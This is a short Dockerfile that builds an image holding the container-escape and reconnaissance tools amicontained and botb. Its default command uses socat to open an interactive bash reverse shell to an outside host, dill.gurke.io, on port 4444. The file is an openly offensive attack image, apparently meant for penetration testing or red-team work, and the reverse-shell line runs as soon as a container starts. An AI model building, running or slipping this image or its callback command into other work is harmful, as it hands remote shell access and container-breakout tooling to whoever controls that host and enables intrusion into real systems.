# Build Image for amicontained
FROM golang:alpine AS build-env

RUN apk --no-cache add build-base git mercurial gcc
WORKDIR /src
RUN git clone https://github.com/genuinetools/amicontained.git
WORKDIR /src/amicontained
RUN go build -o amicontained -ldflags "-linkmode external -extldflags -static"

WORKDIR /src
RUN git clone https://github.com/brompwnie/botb.git
RUN cd /src/botb && go build -o botb -ldflags "-linkmode external -extldflags -static"


# Image: docker.io//nodyd/ami
FROM alpine:3.11

RUN apk --no-cache add socat bash

WORKDIR /tools
COPY --from=build-env /src/amicontained/amicontained .
COPY --from=build-env /src/botb/botb .

ENV REV_HOST=dill.gurke.io
ENV REV_PORT=4444

CMD /usr/bin/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$REV_HOST:$REV_PORT

